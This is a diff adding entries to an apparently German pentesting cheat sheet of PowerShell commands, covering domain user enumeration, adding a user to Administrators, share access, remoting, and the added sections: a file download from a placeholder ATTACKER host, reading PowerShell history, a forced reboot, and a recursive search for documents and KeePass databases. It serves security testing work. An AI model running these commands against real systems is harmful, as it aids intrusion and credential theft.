@@ -21,6 +21,12 @@ get-domainuser | select samaccountname | out-file -encoding utf8 user_list.txt
 Add-LocalGroupMember -Group Administrators -Member "pwn"
 ```
 
+## Powershell Berechtigungen
+
+```powershell
+icacls "C:\PATH\TO\FILE"
+```
+
 ## Powershell Credentials
 
 ### Credential Objekt erstellen
@@ -45,6 +51,22 @@ Vorraussetzungen:
 Find-DomainShare -Domain testlab.local -CheckShareAccess -Credential $Cred
 ```
 
+## Powershell Download Datei
+
+```powershell
+iwr http://ATTACKER/file -o file
+```
+
+## Powershell History
+
+```powershell
+(Get-PSReadlineOption).HistorySavePath
+# View file with type PATH/TO/FILE
+type PATH
+# Try
+type (Get-PSReadlineOption).HistorySavePath 
+```
+
 ## Powershell Kerberos
 
 ### Kerberos Tickets anzeigen
@@ -53,6 +75,11 @@ Find-DomainShare -Domain testlab.local -CheckShareAccess -Credential $Cred
 klist
 ```
 
+## Powershell Neustart
+
+```powershell
+shutdown /r /t 0
+```
 ## Powershell Remoting
 
 Vorraussetzungen:
@@ -68,10 +95,16 @@ New-PSSession -ComputerName IPADDRESS -Credential $Cred
 Enter-PSSession SESSID
 ```
 
-
 ## Powershell Routen
 
 ```powershell
 route add ZIELNETZ mask ZIELMASK GATEWAY
 ```
 
+## Powershell Suche
+
+### Suche nach Dateien mit Dateiendung
+
+```powershell
+Get-Childitem -Path C:\search\me -Include *.txt,*,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.exe,*.bat,*.kdbx -File -Recurse -ErrorAction SilentlyContinue
+```
